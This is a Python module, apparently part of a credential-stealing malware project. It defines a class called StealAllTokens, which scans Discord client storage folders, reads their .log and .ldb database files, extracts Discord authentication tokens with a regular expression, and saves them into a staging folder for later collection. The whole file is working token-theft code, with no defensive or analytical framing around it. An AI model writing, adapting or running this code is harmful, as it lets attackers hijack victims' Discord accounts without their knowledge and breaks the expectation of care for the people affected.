import os
import re
from modules.tokens.all_paths import ALL_DISCORD_PATH

class StealAllTokens:
     
    def __init__(self, kingFolder: str):
      
        self.discord_paths: dict[str, str] =  ALL_DISCORD_PATH
        for name, path in self.discord_paths.items():
            # check if path exists
            if not os.path.exists(path):
                continue
            self.extract_discord_token(path, kingFolder, name)
    
    # extract discord tokens from  file  
    def extract_discord_token(self, path: str, new_path_: str, name: str) -> None:
        ALL_TOKENS: list[str] = []# [\w-]{24}\.[\w-]{6}\.[\w-]{27}
        regex_tokens = re.compile(r'[\w-]{23,28}\.[\w-]{6,7}\.[\w-]{27,}') # [\w-]{23,28}\.[\w-]{6,7}\.[\w-]{27,} 

        for file in os.listdir(path):
            if not file.lower().endswith((".log", ".ldb")):
                continue
            # print(os.path.join(path, file))

            with open(os.path.join(path, file), 'r', encoding='utf-8', errors='ignore') as filedb:
                contante = filedb.read()
                token = regex_tokens.findall(contante)
                
                if token and "".join(token) not in ALL_TOKENS:
                    # print(contante)
                    ALL_TOKENS.append(token)
                    
        if not ALL_TOKENS:
            return None
        token_folder = os.path.join(new_path_, "Token", "Discord")
        os.makedirs(token_folder, exist_ok=True)

        with open(os.path.join(token_folder, f'{name} Token.txt'), 'w', encoding='utf-8', errors="ignore") as file:
            file.write("\n".join(str(x) for x in ALL_TOKENS))
       